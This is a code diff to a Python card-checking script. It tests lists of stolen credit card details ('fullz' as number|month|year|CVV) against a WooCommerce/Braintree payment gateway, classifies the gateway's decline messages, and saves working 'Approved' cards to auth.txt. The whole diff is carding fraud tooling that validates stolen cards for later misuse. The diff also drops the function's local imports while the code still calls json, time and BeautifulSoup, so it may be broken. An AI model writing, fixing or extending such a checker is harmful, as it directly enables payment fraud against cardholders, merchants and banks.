@@ -255,12 +255,7 @@ async def create_payment_method(fullz, session):
         return str(e)
 
 async def multi_checking(x):
-    import httpx, time, json
-    from bs4 import BeautifulSoup
-    from html import unescape
-
     cc, mes, ano, cvv = x.split("|")
-
     if not is_valid_credit_card_number(cc):
         return f"{x} - Credit card number is invalid"
 
@@ -276,8 +271,8 @@ async def multi_checking(x):
     elapsed = round(time.time() - start, 2)
 
     error_message = ""
+    response = ""
 
-    # Parse JSON response
     try:
         json_resp = json.loads(result)
         if "error" in json_resp and "message" in json_resp["error"]:
@@ -287,7 +282,6 @@ async def multi_checking(x):
             if div:
                 error_message = div.get_text(separator=" ", strip=True)
     except Exception:
-        # Fallback parse HTML
         try:
             soup = BeautifulSoup(unescape(result), "html.parser")
             ul = soup.find("ul", class_="woocommerce-error")
@@ -300,37 +294,50 @@ async def multi_checking(x):
                 if div:
                     error_message = div.get_text(separator=" ", strip=True)
         except Exception:
-            error_message = "Unknown response from gateway"
+            error_message = ""
 
-    # Clean message
     if "Reason: " in error_message:
         _, _, after = error_message.partition("Reason: ")
         error_message = after.strip()
 
-    # Determine response type
-    response_type = ""
-    if "Payment method successfully added." in error_message or "success" in error_message.lower():
-        response_type = "Approved"
-        error_message = "Payment method successfully added."
-        # Save approved cards
-        with open("auth.txt", "a", encoding="utf-8") as file:
-            file.write(f"{x} - {response_type} - {error_message} - Taken {elapsed}s\n")
-    elif "Cannot Authorize" in error_message or "Do Not Honor" in error_message:
-        response_type = "Declined"
-    elif "Call Issuer" in error_message:
-        response_type = "Call Issuer"
-    elif "risk_threshold" in error_message or "Gateway Rejected" in error_message:
-        response_type = "Threshold"
+    # Map common Braintree decline/error codes/messages
+    braintree_errors = {
+        "Credit card number is invalid": "Declined - Invalid card number",
+        "CVV is incorrect": "Declined - Wrong CVV",
+        "Expiration date is invalid": "Declined - Expired card",
+        "Processor network declined the transaction": "Declined - Network declined",
+        "Processor declined": "Declined - Processor declined",
+        "Gateway rejected": "Declined - Gateway rejected",
+        "Risk threshold exceeded": "Declined - Risk threshold exceeded",
+        "Transaction refused": "Declined - Transaction refused",
+        "Cardholder authentication failed": "Declined - Authentication failed",
+        "Do not honor": "Declined - Do not honor",
+        "Insufficient funds": "Declined - Insufficient funds",
+        "Card is blocked": "Declined - Card blocked"
+    }
+
+    # Check if any known Braintree decline is in the message
+    for key, value in braintree_errors.items():
+        if key.lower() in error_message.lower():
+            error_message = value
+            response = ""
+            break
+
+    if "Payment method successfully added." in error_message:
+        response = "Approved"
+        error_message = ""
+    elif not response:
+        response = "Declined" if error_message else "Approved"
+
+    if error_message:
+        return f"{x} - {error_message} - Taken {elapsed}s"
     else:
-        response_type = "Declined"
+        resp = f"{x} - {response} - Taken {elapsed}s"
+        if "Approved" in response:
+            with open("auth.txt", "a", encoding="utf-8") as file:
+                file.write(resp + "\n")
+        return resp
 
-    # Return full readable result
-    resp_text = f"═══[ {'✅ Approved' if response_type=='Approved' else '❌ ' + response_type} ]═══\n"
-    resp_text += f"[⌇] Card       ➜ {x}\n"
-    resp_text += f"[⌇] Response   ➜ {error_message}\n"
-    resp_text += f"[⌇] Time       ➜ {elapsed}s"
-
-    return resp_text
 
 
 
